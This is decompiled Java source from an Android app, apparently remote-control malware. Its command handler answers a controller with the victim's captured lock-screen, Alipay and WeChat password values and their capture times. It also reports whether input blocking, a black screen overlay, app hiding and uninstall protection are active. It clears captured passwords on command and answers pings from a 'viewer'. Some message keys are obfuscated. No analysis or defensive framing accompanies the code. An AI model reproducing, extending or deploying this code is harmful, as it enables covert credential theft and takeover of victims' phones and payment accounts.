package com.storm.safe.rock.service.modules.command;

import android.content.SharedPreferences;
import com.storm.safe.rock.network.C0267a0;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.service.modules.cipher.C0335a1;
import com.storm.safe.rock.util.StringUtil;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;
import java.util.function.BiFunction;
import kotlin.jvm.internal.Ref$BooleanRef;
import org.json.JSONObject;
import p000.C0107as;
import p000.C0454ef;
import p000.C1227sm;
import p000.C1351vv;
import p000.InterfaceC0726jp;
import p000.InterfaceC0876mv;
import p000.fd0;
import p000.kg1;
import p000.l10;
import p000.t60;
import p000.uz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.command.a3 */
/* loaded from: classes2.dex */
public final class C0346a3 implements InterfaceC0726jp {

    /* renamed from: a0 */
    public static final ConcurrentHashMap f53594a0;

    static {
        new C1227sm(null);
        f53594a0 = new ConcurrentHashMap();
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a0 */
    public final boolean mo210872a0(String str) {
        return t60.m214690a8(this, str);
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a1 */
    public final Set mo210873a1() {
        return kg1.m213542f1("GET_DEVICE_STATE", "GET_PASSWORD_STATUS", "CLEAR_PASSWORD", "DEVICE_PING");
    }

    /* JADX WARN: Failed to restore switch over string. Please report as a decompilation issue */
    /* JADX WARN: Removed duplicated region for block: B:136:0x0332 A[Catch: Exception -> 0x02cd, TryCatch #2 {Exception -> 0x02cd, blocks: (B:109:0x02c8, B:115:0x02d4, B:136:0x0332, B:138:0x0343, B:140:0x0349, B:142:0x034d, B:122:0x02f8, B:124:0x0300, B:126:0x0306, B:128:0x030b, B:129:0x030e, B:130:0x0317, B:133:0x0320, B:134:0x032a, B:137:0x033a), top: B:150:0x02c8 }] */
    /* JADX WARN: Removed duplicated region for block: B:140:0x0349 A[Catch: Exception -> 0x02cd, TryCatch #2 {Exception -> 0x02cd, blocks: (B:109:0x02c8, B:115:0x02d4, B:136:0x0332, B:138:0x0343, B:140:0x0349, B:142:0x034d, B:122:0x02f8, B:124:0x0300, B:126:0x0306, B:128:0x030b, B:129:0x030e, B:130:0x0317, B:133:0x0320, B:134:0x032a, B:137:0x033a), top: B:150:0x02c8 }] */
    @Override // p000.InterfaceC0726jp
    /* renamed from: a2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object mo210874a2(String str, JSONObject jSONObject, uz0 uz0Var, InterfaceC0876mv interfaceC0876mv) {
        String strOptString;
        C0323a8 c0323a8M214869a5;
        String str2;
        String str3;
        C0323a8 c0323a8M214869a52;
        C0267a0 c0267a0;
        C0454ef c0454ef;
        C0323a8 c0323a8M214869a53;
        String str4 = "none";
        long jOptLong = 0;
        boolean z = true;
        boolean z2 = false;
        String str5 = "";
        switch (str.hashCode()) {
            case -1996504979:
                if (str.equals("CLEAR_PASSWORD")) {
                    t60.m214714d6("DeviceStateCmdHandler", "收到清除密码命令");
                    if (jSONObject != null) {
                        try {
                            strOptString = jSONObject.optString("passwordType", "");
                        } catch (Exception e) {
                            t60.m214705c6("DeviceStateCmdHandler", "清除密码失败", e);
                            break;
                        }
                    } else {
                        strOptString = null;
                    }
                    if (strOptString == null) {
                        strOptString = "";
                    }
                    C0107as c0106ar = C0107as.f45610a3.getInstance(uz0Var.f60536a0);
                    C0335a1 c0600hy = C0335a1.f53283c5.getInstance();
                    int iHashCode = strOptString.hashCode();
                    if (iHashCode == -1414960566) {
                        if (strOptString.equals("alipay")) {
                            c0106ar.m210506a5("none", false, "");
                            t60.m214714d6("DeviceStateCmdHandler", "支付宝密码已清空");
                        }
                        c0323a8M214869a5 = uz0Var.m214869a5();
                        if (c0323a8M214869a5 != null) {
                        }
                    } else if (iHashCode != -791770330) {
                        if (iHashCode == 3327275 && strOptString.equals("lock")) {
                            c0106ar.m210507a6("none", false, "");
                            if (c0600hy != null) {
                                c0600hy.m211814b4(true);
                            }
                            if (c0600hy != null) {
                                c0600hy.m211814b4(false);
                            }
                            uz0Var.m214865a1(null);
                            t60.m214714d6("DeviceStateCmdHandler", "锁屏密码已清空（AppStatusManager + CipherCaptureManager + 去重列表）");
                        } else {
                            t60.m214726f4("DeviceStateCmdHandler", "未知的密码类型: ".concat(strOptString));
                        }
                        c0323a8M214869a5 = uz0Var.m214869a5();
                        if (c0323a8M214869a5 != null && c0323a8M214869a5.f53103a3) {
                            JSONObject jSONObject2 = new JSONObject();
                            jSONObject2.put("passwordType", strOptString);
                            jSONObject2.put("cleared", true);
                            c0323a8M214869a5.m211658c4(StringUtil.m212470a0("O1gCKVo3HipoMidcEChIPA=="), jSONObject2);
                            t60.m214714d6("DeviceStateCmdHandler", "密码清除确认已发送");
                            break;
                        }
                    } else if (strOptString.equals("wechat")) {
                        c0106ar.m210508a7("none", false, "");
                        t60.m214714d6("DeviceStateCmdHandler", "微信密码已清空");
                        c0323a8M214869a5 = uz0Var.m214869a5();
                        if (c0323a8M214869a5 != null) {
                        }
                    } else {
                        t60.m214726f4("DeviceStateCmdHandler", "未知的密码类型: ".concat(strOptString));
                        c0323a8M214869a5 = uz0Var.m214869a5();
                        if (c0323a8M214869a5 != null) {
                            JSONObject jSONObject22 = new JSONObject();
                            jSONObject22.put("passwordType", strOptString);
                            jSONObject22.put("cleared", true);
                            c0323a8M214869a5.m211658c4(StringUtil.m212470a0("O1gCKVo3HipoMidcEChIPA=="), jSONObject22);
                            t60.m214714d6("DeviceStateCmdHandler", "密码清除确认已发送");
                        }
                    }
                }
                break;
            case -1185595635:
                if (str.equals("GET_PASSWORD_STATUS")) {
                    t60.m214714d6("DeviceStateCmdHandler", "获取密码状态");
                    try {
                        C0107as c0106ar2 = C0107as.f45610a3.getInstance(uz0Var.f60536a0);
                        SharedPreferences sharedPreferences = c0106ar2.f45619a1;
                        String str6 = C0107as.f45613a6;
                        t60.m214702c3("DeviceStateCmdHandler", "锁屏密码: detected=" + sharedPreferences.getBoolean(str6, false) + ", type=" + c0106ar2.m210503a2());
                        String strM210504a3 = c0106ar2.m210504a3();
                        JSONObject jSONObject3 = new JSONObject();
                        jSONObject3.put("deviceId", uz0Var.f60536a0.m211470g4());
                        JSONObject jSONObject4 = new JSONObject();
                        try {
                            jSONObject4.put("detected", c0106ar2.f45619a1.getBoolean(str6, false));
                            jSONObject4.put("type", c0106ar2.m210503a2());
                            SharedPreferences sharedPreferences2 = c0106ar2.f45619a1;
                            str3 = C0107as.f45615a8;
                            String string = sharedPreferences2.getString(str3, "");
                            if (string == null) {
                                string = "";
                            }
                            jSONObject4.put("value", string);
                            jSONObject4.put("captureTime", c0106ar2.f45619a1.getLong(C0107as.f45616a9, 0L));
                            jSONObject3.put("lockPassword", jSONObject4);
                            JSONObject jSONObject5 = new JSONObject();
                            jSONObject5.put("captured", c0106ar2.f45619a1.getBoolean(C0107as.f45611a4, false));
                            String string2 = c0106ar2.f45619a1.getString("alipay_password_type", "none");
                            if (string2 == null) {
                                string2 = "none";
                            }
                            jSONObject5.put("type", string2);
                            String string3 = c0106ar2.f45619a1.getString("alipay_password_value", "");
                            if (string3 == null) {
                                string3 = "";
                            }
                            jSONObject5.put("value", string3);
                            jSONObject5.put("captureTime", c0106ar2.f45619a1.getLong("alipay_capture_time", 0L));
                            jSONObject3.put("alipayPassword", jSONObject5);
                            str2 = "wechatPassword";
                            JSONObject jSONObject6 = new JSONObject();
                            jSONObject6.put("captured", c0106ar2.f45619a1.getBoolean(C0107as.f45612a5, false));
                            String string4 = c0106ar2.f45619a1.getString("wechat_password_type", "none");
                            if (string4 != null) {
                                str4 = string4;
                            }
                            jSONObject6.put("type", str4);
                            String string5 = c0106ar2.f45619a1.getString("wechat_password_value", "");
                            if (string5 == null) {
                                string5 = "";
                            }
                            jSONObject6.put("value", string5);
                            jSONObject6.put("captureTime", c0106ar2.f45619a1.getLong("wechat_capture_time", 0L));
                            jSONObject3.put("wechatPassword", jSONObject6);
                            jSONObject3.put("statusFileContent", strM210504a3);
                            c0323a8M214869a52 = uz0Var.m214869a5();
                        } catch (Exception e2) {
                            e = e2;
                            str2 = "DeviceStateCmdHandler";
                        }
                        try {
                            if (c0323a8M214869a52 == null || !c0323a8M214869a52.f53103a3) {
                                str2 = "DeviceStateCmdHandler";
                                t60.m214726f4(str2, "NetworkManager未初始化或未连接，无法发送密码状态");
                            } else {
                                c0323a8M214869a52.m211658c4(StringUtil.m212470a0("O1gCKVo3HipoIj9YBS9e"), jSONObject3);
                                String strM210503a2 = c0106ar2.m210503a2();
                                String string6 = c0106ar2.f45619a1.getString(str3, "");
                                if (string6 != null) {
                                    str5 = string6;
                                }
                                str2 = "DeviceStateCmdHandler";
                                t60.m214714d6(str2, "密码状态已发送: lockType=" + strM210503a2 + ", lockValue=" + str5);
                            }
                        } catch (Exception e3) {
                            e = e3;
                            t60.m214705c6(str2, "发送密码状态失败", e);
                            return C1351vv.f60710b1;
                        }
                    } catch (Exception e4) {
                        e = e4;
                        str2 = "DeviceStateCmdHandler";
                    }
                }
                break;
            case 80963505:
                if (str.equals("GET_DEVICE_STATE")) {
                    t60.m214714d6("DeviceStateCmdHandler", "获取设备状态命令已接收");
                    try {
                        fd0 fd0VarM214868a4 = uz0Var.m214868a4();
                        try {
                            if (!uz0Var.f60536a0.getSharedPreferences(StringUtil.m212470a0("J1YWPUQ2CxFEJSpNFA=="), 0).getBoolean(StringUtil.m212470a0("J1YWPUQ2CxFSPypbHT9J"), false)) {
                                if (!uz0Var.f60536a0.f52411e2) {
                                    z = false;
                                }
                            }
                        } catch (Exception unused) {
                            z = uz0Var.f60536a0.f52411e2;
                        }
                        JSONObject jSONObject7 = new JSONObject();
                        jSONObject7.put("deviceId", uz0Var.f60536a0.m211470g4());
                        if (fd0VarM214868a4 != null && (c0454ef = fd0VarM214868a4.f56199a1) != null) {
                            z2 = c0454ef.f55983a5;
                        }
                        jSONObject7.put("inputBlocked", z2);
                        jSONObject7.put("loggingEnabled", z);
                        jSONObject7.put("blackScreenActive", uz0Var.f60536a0.f52469k0);
                        jSONObject7.put("appHidden", uz0Var.f60536a0.m211482h6());
                        jSONObject7.put("uninstallProtectionEnabled", uz0Var.f60536a0.f52477k8);
                        C0323a8 c0323a8M214869a54 = uz0Var.m214869a5();
                        if (c0323a8M214869a54 != null && c0323a8M214869a54.f53103a3) {
                            if (c0323a8M214869a54.f53103a3 && (c0267a0 = c0323a8M214869a54.f53102a2) != null) {
                                c0267a0.m211369b0(jSONObject7);
                            }
                            t60.m214714d6("DeviceStateCmdHandler", "设备状态已发送: inputBlocked=" + jSONObject7.optBoolean("inputBlocked") + ", blackScreenActive=" + jSONObject7.optBoolean("blackScreenActive"));
                            break;
                        } else {
                            t60.m214726f4("DeviceStateCmdHandler", "NetworkManager未初始化或未连接，无法发送设备状态");
                            break;
                        }
                    } catch (Exception e5) {
                        t60.m214705c6("DeviceStateCmdHandler", "发送设备状态失败", e5);
                        break;
                    }
                }
                break;
            case 639509947:
                if (str.equals("DEVICE_PING")) {
                    if (jSONObject != null) {
                        try {
                            jOptLong = jSONObject.optLong("timestamp", 0L);
                        } catch (Exception e6) {
                            t60.m214705c6("DeviceStateCmdHandler", "处理 DEVICE_PING 失败", e6);
                            break;
                        }
                    }
                    String strOptString2 = jSONObject != null ? jSONObject.optString("viewerId", "") : null;
                    if (strOptString2 != null) {
                        str5 = strOptString2;
                    }
                    final long jCurrentTimeMillis = System.currentTimeMillis();
                    final Ref$BooleanRef ref$BooleanRef = new Ref$BooleanRef();
                    ConcurrentHashMap concurrentHashMap = f53594a0;
                    final l10 l10Var = new l10() { // from class: com.storm.safe.rock.service.modules.command.DeviceStateCommandHandler$handleDevicePing$1
                        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                        {
                            super(2);
                        }

                        @Override // p000.l10
                        public final Object invoke(Object obj, Object obj2) {
                            Long l = (Long) obj2;
                            t60.m214695b6((String) obj, "<anonymous parameter 0>");
                            long j = jCurrentTimeMillis;
                            if (l != null && j - l.longValue() < 300) {
                                return l;
                            }
                            ref$BooleanRef.f57622a0 = true;
                            return Long.valueOf(j);
                        }
                    };
                    concurrentHashMap.compute(str5, new BiFunction() { // from class: sl
                        @Override // java.util.function.BiFunction
                        public final Object apply(Object obj, Object obj2) {
                            l10 l10Var2 = l10Var;
                            t60.m214695b6(l10Var2, "$tmp0");
                            return (Long) l10Var2.invoke(obj, obj2);
                        }
                    });
                    if (ref$BooleanRef.f57622a0 && (c0323a8M214869a53 = uz0Var.m214869a5()) != null && c0323a8M214869a53.f53103a3) {
                        JSONObject jSONObject8 = new JSONObject();
                        jSONObject8.put("timestamp", jOptLong);
                        jSONObject8.put("viewerId", str5);
                        c0323a8M214869a53.m211658c4(StringUtil.m212470a0("L1wHM049Mz5YPyw="), jSONObject8);
                        break;
                    }
                }
                break;
        }
        return C1351vv.f60710b1;
    }
}
